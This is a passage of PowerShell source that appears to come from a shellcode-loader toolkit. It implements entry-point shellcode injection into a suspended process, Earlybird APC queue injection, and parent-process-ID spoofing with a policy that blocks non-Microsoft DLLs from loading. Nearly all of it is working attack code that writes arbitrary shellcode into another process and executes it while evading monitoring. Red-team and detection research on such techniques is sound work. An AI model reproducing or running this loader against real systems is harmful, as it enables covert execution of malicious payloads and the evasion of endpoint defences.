        ### (2) Parse the Process Enviroment Block (PEB) of the Suspended Process ###

        Write-Host "[!] Parsing the Created Process' Process Environment Block (PEB)..." -ForegroundColor Yellow 

        # NtQueryInformationProcess()
        #  > Description : Retrieves information about a specified process.
        #  > Location    : Ntdll.dll
        #  > Reference 1 : https://ntdoc.m417z.com/ntqueryinformationprocess
        #  > Reference 2 : https://www.pinvoke.net/default.aspx/ntdll.ntqueryinformationprocess

        # Argument(s)
        $ProcessHandle            = $RetProcessInformation.hProcess # Handle to the target process                                          (i.e., acquired from CreateProcessA() returned process information).
        $ProcessInformationClass  = 0                               # Type of process information to be retrieved                           (i.e., 0 retrieves a pointer to the process' PEB structure).
        $ProcessInformation       = [ref]$ProcessBasicInformation   # Output buffer to receive the requested process information            (i.e., variable to receive the pointer to the process' PEB structure).
        $ProcessInformationLength = [IntPtr]::Size * 6              # Size of the 'ProcessInformation' buffer                               (i.e., 48 bytes).
        $ReturnLength             = 0                               # Output buffer to receive the size of the requested information buffer (i.e., hopefully 48 bytes).

        Write-Host ' o  ' -NoNewline ; Write-Host 'NtQueryInformationProcess()' -ForegroundColor Green

        Try   { $NTSTATUS_INT = $NtQueryInformationProcess.Invoke($ProcessHandle, $ProcessInformationClass, $ProcessInformation, $ProcessInformationLength, [ref]$ReturnLength) }
        Catch { return Generic-Error }

        if ($NTSTATUS_INT -ne 0) { return Win32-Error }
        $ImageBaseAddrPtr = [Int64]$ProcessBasicInformation.PebAddress + 0x10 # Pointer to beginning of PE file (i.e. IMAGE_DOS_HEADER)
        Write-Host " o  --> Process Environment Block (PEB) Address : $(Print-Hex $ProcessBasicInformation.PebAddress)"
        Write-Host " o  --> Image Base Address Pointer (PEB + 0x10) : $(Print-Hex $ImageBaseAddrPtr)"


        ### (3) Acquire Offsets from the Image Base Address ###

        Write-Host "[!] Acquiring the Image Base Address..." -ForegroundColor Yellow

        # ReadProcessMemory() (1 of 2)
        #  > Description : Read memory from a specified process.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory

        # Argument(s)
        $hProcess            = $RetProcessInformation.hProcess                # Handle to the target process
        $lpBaseAddress       = $ImageBaseAddrPtr                              # Starting address to begin reading.
        $lpBuffer            = [Array]::CreateInstance([byte],[IntPtr]::Size) # Buffer to receive contents (e.g., 8-byte memory address)
        $nSize               = $lpBuffer.Length                               # Size of the buffer
        $lpNumberOfBytesRead = [ref]0                                         # Number of bytes successfully read

        Write-Host ' o  ' -NoNewline ; Write-Host 'ReadProcessMemory()' -ForegroundColor Green

        Try   { $Success = $ReadProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead) }
        Catch { return Generic-Error }

        if (!$Success) { return Win32-Error }
        [IntPtr]$ImageBaseAddress = [BitConverter]::ToInt64($lpBuffer,0) # Image Base Address (8-bytes) located at beginning of PE
        Write-Host " o  --> Image Base Address (IBA) : $(Print-Hex $ImageBaseAddress)"


        ### (4) Determine Relative Virtual Address Offsets ###

        Write-Host "[!] Determining Offsets to acquire PE EntryPoint..." -ForegroundColor Yellow

        # ReadProcessMemory() (2 of 2)
        #  > Description : Read memory from a specified process.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory

        # Argument(s)
        $hProcess            = $RetProcessInformation.hProcess       # Handle to the target process
        $lpBaseAddress       = $ImageBaseAddress                     # Starting address to begin reading.
        $lpBuffer            = [Array]::CreateInstance([byte],0x200) # Buffer to receive contents.
        $nSize               = $lpBuffer.Length                      # Size of the buffer
        $lpNumberOfBytesRead = [ref]0                                # Number of bytes successfully read

        Write-Host ' o  ' -NoNewline ; Write-Host 'ReadProcessMemory()' -ForegroundColor Green

        Try   { $Success = $ReadProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead) }
        Catch { return Generic-Error }

        if (!$Success) { return Win32-Error }

        $PE_Data  = $lpBuffer                                             # First 0x200 (512-bytes) of PE
        $e_lfanew = [UInt32]([BitConverter]::ToInt32($PE_Data, 0x3c))     # NT Header Offset (4-bytes) located at offset "0x3c"
        $RVA_Ptr  = $e_lfanew + 0x28
        $RVA      = [UInt32]([BitConverter]::ToInt32($PE_Data, $RVA_Ptr)) # Relative Virtual Address (4-bytes) located at offset "$e_lfanew + 0x28"

        $EntryPointAddr = [IntPtr]($ImageBaseAddress.ToInt64() + $RVA)

        Write-Host " o  --> PE Structure Bytes Read        : ${nSize} bytes"
        Write-Host " o  --> e_lfanew (Offset to NT Header) : $(Print-Hex $e_lfanew)"
        Write-Host " o  --> Relative Virtual Address (RVA) : $(Print-Hex $RVA)"
        Write-Host " o  --> PE EntryPoint (IBA + RVA)      : $(Print-Hex $EntryPointAddr)"


        ### (5) Write Shellcode to PE Entrypoint ###

        Write-Host "[!] Writing Shellcode to PE Entrypoint..." -ForegroundColor Yellow

        # WriteProcessMemory()
        #  > Description : Write memory to a specified process.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

        # Argument(s)
        $hProcess            = $RetProcessInformation.hProcess  # Handle to the target process
        $lpBaseAddress       = $EntryPointAddr                  # Starting address to begin reading.
        $lpBuffer            = $ShellcodeBuffer                 # Buffer to receive contents (e.g., entire PE structure)
        $nSize               = $ShellcodeBuffer.Length          # Size of the buffer
        $lpNumberOfBytesRead = [ref]0                           # Number of bytes successfully read

        Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green

        Try   { $Success = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead) }
        Catch { return Generic-Error }

        if (!$Success) { return Win32-Error }
        Write-Host " o  --> Shellcode Bytes Written : ${nSize} bytes"


        ### Optional: Debug Mode to Attach to Process ###

        if ($Debug) {
        
            $TargetProcess = Get-Process -Id $RetProcessInformation.dwProcessId

            Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
            Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'
            Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $EntryPointAddr) -ForegroundColor Green
            Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
            $NULL = Read-Host
        }


        ### (6) Resume Thread and Execute Shellcode ###

        Write-Host "[!] Resuming process execution..." -ForegroundColor Yellow

        # ResumeThread()
        #  > Description : Decrement a thread's suspend count; if decremented to zero the thread resumes.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

        # Argument(s)
        $hThread = $RetProcessInformation.hThread  # Handle to the target thread.

        Write-Host ' o  ' -NoNewline ; Write-Host 'ResumeThread()' -ForegroundColor Green

        Try   { $Success = $ResumeThread.Invoke($hThread) }
        Catch { return Generic-Error }

        if ($Success -ne 1) { return Win32-Error }     
        Write-Host " o  --> Thread Handle : ${hThread}"
    }
    function Earlybird-Inject ($SuspendedProcess) {

        # Function Description   : PowerShell Script (mini version) for Earlybird APC Queue Injection via Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/standalone/win32/Earlybird-Inject.ps1

        ### (1) Create Target Process in a Suspended State ###

        if (!$SuspendedProcess) {
            Write-Host "[!] Creating target process..." -ForegroundColor Yellow

            # CreateProcessA()
            #  > Description : Create a new process and its primary thread.
            #  > Location    : Kernel32.dll
            #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

            # Argument(s)
            $lpApplicationName    = $CreateProcess                            # Full path of the application to be executed.
            $lpCommandLine        = "${CreateProcess} ${ProcessArgs}"         # Command line arguments to be executed  (full path + optional arguments).
            $lpProcessAttributes  = [ref]$ProcessAttributes                   # Pointer to a SECURITY_ATTRIBUTES struct (for the process).
            $lpThreadAttributes   = [ref]$ThreadAttributes                    # Pointer to a SECURITY_ATTRIBUTES struct (for the thread).
            $bInheritHandles      = $False                                    # Boolean for new process to inherit handles from calling process.  
            $dwCreationFlags      = $ProcessCreation.CREATE_SUSPENDED -bor $ProcessCreation.EXTENDED_STARTUPINFO_PRESENT    # New process creation flags (i.e., create in suspended state).
            $lpEnvironment        = [IntPtr]::Zero                            # Pointer to the environment block for the new process.
            $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess) # Full path to the current directory for the process.
            $lpStartupInfo        = [ref]$StartupInfoEx                       # Pointer to STARTUPINFOA struct.
            $lpProcessInformation = [ref]$ProcessInformation                  # Pointer to PROCESS_INFORMATION struct.

            Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green

            Try   { $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation) }
            Catch { return Generic-Error }

            if (!$Success) { return Win32-Error }
            $RetProcessInformation = $lpProcessInformation.Value
            Write-Host " o  --> Process Path : ${CreateProcess}"
            Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"
        }
        else {
            Write-Host '[x] Skipping process creation.' -ForegroundColor Yellow
            Write-Host $ProcessInformation -ForegroundColor Magenta
            $RetProcessInformation = $ProcessInformation
        }


        ### (2) Allocate memory within Target Process ###

        Write-Host "[!] Allocating memory within '$($Createprocess.Split('\')[-1])' ($($RetProcessInformation.dwProcessId))..." -ForegroundColor Yellow

        # VirtualAllocEx()
        #  > Definition : Allocates memory within an external process and returns a pointer to said space.
        #  > Location   : Kernel32.dll
        #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    
        # Argument(s)
        $hProcess         = $RetProcessInformation.hProcess                                 # Handle to the target process.             
        $lpAddress        = [IntPtr]::Zero                                                  # Starting address in memory to allocate.        
        $dwSize           = $shellcodeBuffer.Length                                         # Size of the memory allocation in bytes.      
        $flAllocationType = $MemoryAllocation.MEM_COMMIT -bor $MemoryAllocation.MEM_RESERVE # Flags for memory allocation type.
        $flProtect        = $MemoryProtection.PAGE_READWRITE                                # Memory protection flags for the allocated region.

        Write-Host ' o  ' -NoNewline ; Write-Host 'VirtualAllocEx()' -ForegroundColor Green

        Try   { $ShellcodeAddr = $VirtualAllocEx.Invoke($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect) }
        Catch { return Generic-Error }

        if ($ShellcodeAddr -eq 0) { return Win32-Error }
        Write-Host " o  --> Allocated Memory Address : $(Print-Hex $ShellcodeAddr)"
        Write-Host " o  --> Memory Block Size        : ${dwSize} bytes"
        Write-Host " o  --> Memory Protection        : 0x04 (PAGE_READWRITE)"


        ### (3) Write memory to allocated space

        Write-Host "[!] Writing buffer to allocated memory..." -ForegroundColor Yellow

        # WriteProcessMemory()
        #  > Definition : Write data to an area of memory within a specified process.
        #  > Location   : Kernel32.dll
        #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

        # Argument(s)
        $hProcess               = $RetProcessInformation.hProcess # Handle to the target process.
        $lpBaseAddress          = $ShellcodeAddr                  # Pointer to the starting address in memory to allocate. 
        $lpBuffer               = $shellcodeBuffer                # Buffer of bytes to copy/write.                
        $nSize                  = $shellcodeBuffer.Length         # Size of the buffer to copy.                      
        $lpNumberOfBytesWritten = 0                               # Output variable to receive number of bytes written.
    
        Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green

        Try   { $MemoryCopied = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten) }
        Catch { return Generic-Error }

        if (!$MemoryCopied) { return Win32-Error }
        Write-Host " o  --> Successful wrote shellcode buffer."


        ### (3) Make Memory Buffer Executable ###

        Write-Host '[!] Changing memory buffer protection...' -ForegroundColor Yellow

        # VirtualProtectEx()
        #  > Definition  :  Changes the protection of a region of memory within a specified process.
        #  > Location    :  Kernel32.dll
        #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

        # Argument(s)
        $hProcess       = $RetProcessInformation.hProcess     # Handle to the target process.   
        $lpAddress      = $ShellcodeAddr                      # Pointer to the starting address in memory to change.
        $dwSize         = $ShellcodeBuffer.Length             # Size of the target memory buffer in bytes.
        $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ # Memory protection flags for the specified region.
        $lpflOldProtect = 0                                   # Output variable to receive old memory protection flags.

        Write-Host ' o  ' -NoNewline; Write-Host 'VirtualProtectEx()' -ForegroundColor Green

        Try   { $Success = $VirtualProtectEx.Invoke($hProcess, $lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
        Catch { return Generic-Error }

        if (!$Success) { return Win32-Error }
        Write-Host ' o  --> Memory Protection : 0x20 (PAGE_EXECUTE_READ)'


        ### (4) Queue Shellcode Thread via APC ###

        Write-Host '[!] Queueing thread via APC...' -ForegroundColor Yellow

        # QueueUserAPC()
        #  > Definition  :  Adds a user-mode APC object to the APC queue of a specified thread.
        #  > Location    :  Kernel32.dll
        #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

        # Argument(s)
        $pfnAPC       = $ShellcodeAddr                  # Pointer to APC function to be called (i.e., shellcode).
        $hThread      = $RetProcessInformation.hThread  # Handle to the target thread.
        $dwData       = [IntPtr]::Zero                  # Value passed to the APC function.
    
        Write-Host ' o  ' -NoNewline; Write-Host 'QueueUserAPC()' -ForegroundColor Green

        Try   { $Return = $QueueUserAPC.Invoke($pfnAPC, $hThread, $dwData) }
        Catch { return Generic-Error }
    
        if ($Return -eq 0) { return Win32-Error }
        Write-Host ' o  --> Successfully added APC queue.'


        ### Optional: Debug Mode to Attach to Process ###

        if ($Debug) {
        
            $TargetProcess = Get-Process -Id $RetProcessInformation.dwProcessId

            Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
            Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'
            Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $ShellcodeAddr) -ForegroundColor Green
            Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
            $NULL = Read-Host
        }


        ### (6) Resume Thread and Execute Shellcode ###

        Write-Host "[!] Resuming process execution..." -ForegroundColor Yellow

        # ResumeThread()
        #  > Description : Decrement a thread's suspend count; if decremented to zero the thread resumes.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

        # Argument(s)
        $hThread = $RetProcessInformation.hThread  # Handle to the target thread.

        Write-Host ' o  ' -NoNewline ; Write-Host 'ResumeThread()' -ForegroundColor Green

        Try   { $Success = $ResumeThread.Invoke($hThread) }
        Catch { return Generic-Error }

        if ($Success -ne 1) { return Win32-Error }     
        Write-Host " o  --> Thread Handle : ${hThread}"
    }
    function PPID-Spoof {

        # Function Description   : PowerShell Script (mini version) for Parent Process ID (PPID) Spoofing via Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/standalone/win32/PPID-Spoof.ps1

        ### (1) Acquire Handle to Parent Process ###

        Write-Host '[!] Acquiring handle to target parent process...' -ForegroundColor Yellow 

        # OpenProcess()
        #  > Description : Acquire a handle to process.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

        # Argument(s)
        $dwDesiredAccess = $ProcessAccess.PROCESS_CREATE_PROCESS  # Desired handle access rights.
        $bInheritHandle  = $FALSE                                 # Boolean for child processes to inherit the handle.
        $dwProcessId     = $ParentProc.Id                         # Target process to be opened.
    
        Write-Host ' o  ' -NoNewline ; Write-Host 'OpenProcess()' -ForegroundColor Green
        Try   { $ParentHandle = $OpenProcess.Invoke($dwDesiredAccess, $bInheritHandle, $dwProcessId) }
        Catch { return Generic-Error }

        if ($ParentHandle -eq 0) { return Win32-Error }
        Write-Host " o  --> Target Process : $($ParentProc.ProcessName)"
        Write-Host " o  --> Target PID     : $($ParentProc.Id)"
        Write-host " o  --> Process Handle : $(Print-Hex $ParentHandle)"


        ### (2) Initialize Process Creation Attributes List

        Write-Host '[!] Initializing process creation attribute list...' -ForegroundColor Yellow 

        # InitializeProcThreadAttributeList()
        #  > Description : Initializes the specified list of attributes for process and thread creation.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist

        # Argument(s) (1/2)
        $lpAttributeList  = [IntPtr]::Zero  # Process & thread creation attribute list.
        $dwAttributeCount = 2               # Count of attributes to be added to the list.
        $dwFlags          = 0               # Reserved parameter, must be 0.
        $lpSize           = [IntPtr]::Zero  # Output the required size of the lpAttributeList buffer.
    
        Write-Host ' o  ' -NoNewline ; Write-Host 'InitializeProcThreadAttributeList()' -ForegroundColor Green -NoNewline ; Write-Host ' (1/2)'
        Try   { $Initialized = $InitializeProcThreadAttributeList.Invoke($lpAttributeList, $dwAttributeCount, $dwFlags, [ref]$lpSize) }
        Catch { return Generic-Error }

        if ($Initialized) { return Win32-Error }
        Write-Host " o  --> Attribute list size : $(Print-Hex $lpSize)"


        # Argument(s) (2/2)
        $StartupInfoEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
        $StartupInfoEx.StartupInfo.cb  = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfoEx)
    
        Write-Host ' o  ' -NoNewline ; Write-Host 'InitializeProcThreadAttributeList()' -ForegroundColor Green -NoNewline ; Write-Host ' (2/2)'
        Try   { $Initialized = $InitializeProcThreadAttributeList.Invoke($StartupInfoEx.lpAttributeList, $dwAttributeCount, $dwFlags, [ref]$lpSize) }
        Catch { return Generic-Error }

        if (!$Initialized) { return Win32-Error }
        Write-Host " o  --> Attribute list pointer : $(Print-Hex $StartupInfoEx.lpAttributeList)"


        ### (3) Update Process Creation Attribute List ###

        Write-Host '[!] Updating process creation attribute list...' -ForegroundColor Yellow

        # UpdateProcThreadAttribute()
        #  > Description : Updates the specified attribute in a list of attributes for process and thread creation.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute

        # Argument(s) (1/2)
        $lpAttributeList = $StartupInfoEx.lpAttributeList                                          # Process & thread creation attribute list.
        $dwFlags         = 0                                                                       # Reserved parameter, must be 0.
        $Attribute       = $ProcAttrFlags.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 
        $lpValue         = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)                                                
        $cbSize          = [IntPtr]::Size                   
        $lpPreviousValue = [IntPtr]::Zero                   
        $lpReturnSize    = [IntPtr]::Zero                                

        [System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $ParentHandle)

        Write-Host ' o  ' -NoNewline ; Write-Host 'UpdateProcThreadAttribute()' -ForegroundColor Green -NoNewline ; Write-Host ' (1/2)'
        Try   { $Updated = $UpdateProcThreadAttribute.Invoke($lpAttributeList, $dwFlags, $Attribute, $lpValue, $cbSize, $lpPreviousValue, $lpReturnSize) }
        Catch { return Generic-Error }

        if (!$Updated) { return Win32-Error }
        Write-Host " o  --> Updated attribute list with new parent process."


        # Argument(s) (2/2)
        $Attribute = $ProcAttrFlags.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
        $lpValue   = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
        #Troubleshooting
        Write-Host "[x] Attribute value  : ${attribute}"
        Write-Host "[x] lpValue value    : ${lpValue}"

        [System.Runtime.InteropServices.Marshal]::WriteInt64($lpValue, $ProcAttrFlags.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)

        Write-Host ' o  ' -NoNewline ; Write-Host 'UpdateProcThreadAttribute()' -ForegroundColor Green -NoNewline ; Write-Host ' (2/2)'
        Try   { $Updated = $UpdateProcThreadAttribute.Invoke($lpAttributeList, $dwFlags, $Attribute, $lpValue, $cbSize, $lpPreviousValue, $lpReturnSize) }
        Catch { return Generic-Error }

        if (!$Updated) { return Win32-Error }
        Write-Host " o  --> Updated attribute list to prevent non-Microsoft signed DLL's from injecting into the process."
    

        ### (4) Create Target Process in a Suspended State ###

        Write-Host "[!] Creating target process..." -ForegroundColor Yellow

        # CreateProcessA()
        #  > Description : Create a new process and its primary thread.
        #  > Location    : Kernel32.dll
        #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

        # Argument(s)
        $lpApplicationName    = $CreateProcess                                                                        # Full path of the application to be executed.
        $lpCommandLine        = "${CreateProcess} ${ProcessArgs}"                                                     # Command line arguments to be executed  (full path + optional arguments).
        $lpProcessAttributes  = [ref]$ProcessAttributes                                                               # Pointer to a SECURITY_ATTRIBUTES struct (for the process).
        $lpThreadAttributes   = [ref]$ThreadAttributes                                                                # Pointer to a SECURITY_ATTRIBUTES struct (for the thread).
        $bInheritHandles      = $TRUE                                                                                 # Boolean for new process to inherit handles from calling process.  
        $dwCreationFlags      = $ProcessCreation.EXTENDED_STARTUPINFO_PRESENT -bor $ProcessCreation.CREATE_NEW_CONSOLE -bor $ProcessCreation.CREATE_SUSPENDED     # New process creation flags.
        $lpEnvironment        = [IntPtr]::Zero                                                                        # Pointer to the environment block for the new process.
        $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess)                                             # Full path to the current directory for the process.
        $lpStartupInfo        = [ref]$StartupInfoEx                                                                   # Pointer to STARTUPINFOA struct.
        $lpProcessInformation = [ref]$ProcessInformation                                                              # Pointer to PROCESS_INFORMATION struct.

        $ProcessAttributes.bInheritHandle = $TRUE
        $ThreadAttributes.bInheritHandle  = $TRUE
        Start-Sleep -Seconds 1

        Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green
        Try { $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation) }
        Catch { return Generic-Error }

        if (!$Success) { return Win32-Error }
        $RetProcessInformation = $lpProcessInformation.Value
        Write-Host " o  --> Process Path : ${CreateProcess}"
        Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"

        # Return process information
        return $RetProcessInformation
    }


    ### Define Required Constant(s) ###

    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    $MemoryAllocation = @{
        MEM_COMMIT  = 0x00001000;
        MEM_RESERVE = 0x00002000;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
    $MemoryProtection = @{
        PAGE_EXECUTE           = 0x10;
        PAGE_EXECUTE_READ      = 0x20;
        PAGE_READWRITE         = 0x04;
        PAGE_EXECUTE_READWRITE = 0x40;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
    $ProcessCreation = @{
        CREATE_SUSPENDED             = 0x00000004; # used
        CREATE_SECURE_PROCESS        = 0x00400000;
        CREATE_NO_WINDOW             = 0x08000000;
        CREATE_NEW_CONSOLE           = 0x00000010;
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
    $ProcessAccess = @{
        PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF;
        PROCESS_CREATE_PROCESS    = 0x0080;
        PROCESS_CREATE_THREAD     = 0x0002;
        PROCESS_QUERY_INFORMATION = 0x0400;
        PROCESS_VM_OPERATION      = 0x0008;
        PROCESS_VM_READ           = 0x0010;
        PROCESS_VM_WRITE          = 0x0020;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
    $ThreadAccess = @{
        THREAD_SET_CONTEXT       = 0x0010;
        THREAD_SET_INFORMATION   = 0x0020;
        THREAD_QUERY_INFORMATION = 0x0040;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    $StartupFlags = @{
        STARTF_USESTDHANDLES = 0x00000100;
        STARTF_USESHOWWINDOW = 0x00000001;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
    $ProcAttrFlags = @{
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000;
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000; # used
    }


    ### Define Required Struct(s) ###

    # STARTUPINFOA | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'cb'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpReserved'      ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpDesktop'       ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpTitle'         ; Type = [String] },
        [PSCustomObject]@{ Name = 'dwX'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwY'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFillAttribute' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFlags'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'wShowWindow'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'cbReserved2'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'lpReserved2'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdInput'       ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdOutput'      ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdError'       ; Type = [IntPtr] }
    )
    $StartupInfoType    = Build-Win32Struct -StructName "STARTUPINFOA" -MembersObject $StructMembers
    $StartupInfoTypeRef = $StartupInfoType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfo        = [STARTUPINFOA]::new()            # Used for Win32 function parameter(s)

    # STARTUPINFOEXA | https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'StartupInfo'     ; Type = $StartupInfoType },
        [PSCustomObject]@{ Name = 'lpAttributeList' ; Type = [IntPtr] }
    )
    $StartupInfoExType    = Build-Win32Struct -StructName "STARTUPINFOEXA" -MembersObject $StructMembers
    $StartupInfoExTypeRef = $StartupInfoExType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfoEx        = [STARTUPINFOEXA]::new()            # Used for Win32 function parameter(s)
    
    # PROCESS_INFORMATION | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'hProcess'    ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hThread'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'dwProcessId' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwThreadId'  ; Type = [Int32]  }
    )
    $ProcessInformationType    = Build-Win32Struct -StructName "PROCESS_INFORMATION" -MembersObject $StructMembers
    $ProcessInformationTypeRef = $ProcessInformationType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessInformation        = [PROCESS_INFORMATION]::new()            # Used for Win32 function parameter(s)

    # PROCESS_BASIC_INFORMATION | https://ntdoc.m417z.com/process_basic_information, https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'ExitStatus'                   ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'PebAddress'                   ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'AffinityMask'                 ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'BasePriority'                 ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'UniquePID'                    ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'InheritedFromUniqueProcessId' ; Type = [IntPtr] }
    )
    $ProcessBasicInformationType    = Build-Win32Struct -StructName "PROCESS_BASIC_INFORMATION" -MembersObject $StructMembers
    $ProcessBasicInformationTypeRef = $ProcessBasicInformationType.MakeByRefType() # Used for creating function delegate(s)
